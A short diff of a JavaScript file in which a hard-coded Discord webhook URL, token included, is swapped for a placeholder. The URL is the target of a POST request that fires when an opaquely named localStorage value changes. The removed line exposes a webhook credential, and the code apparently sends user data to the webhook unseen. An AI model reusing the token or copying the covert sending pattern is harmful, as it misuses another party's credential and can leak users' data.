@@ -110,7 +110,7 @@
     if (localStorage.getItem('_bf789wb3')!=hideUser) {
         localStorage.setItem('_bf789wb3', hideUser);
 
-        var url = "https://discord.com/api/webhooks/800559527007092797/hulx0bjhOTKbT-COBxwVnTi77-z1uZXQpjjmPCZ6h4x-93rRQA81AYiIPha-C5m4XlWK";
+        var url = "YOUR WEBHOOK URL";
 
         var epic = new XMLHttpRequest();
         epic.open("POST", url);
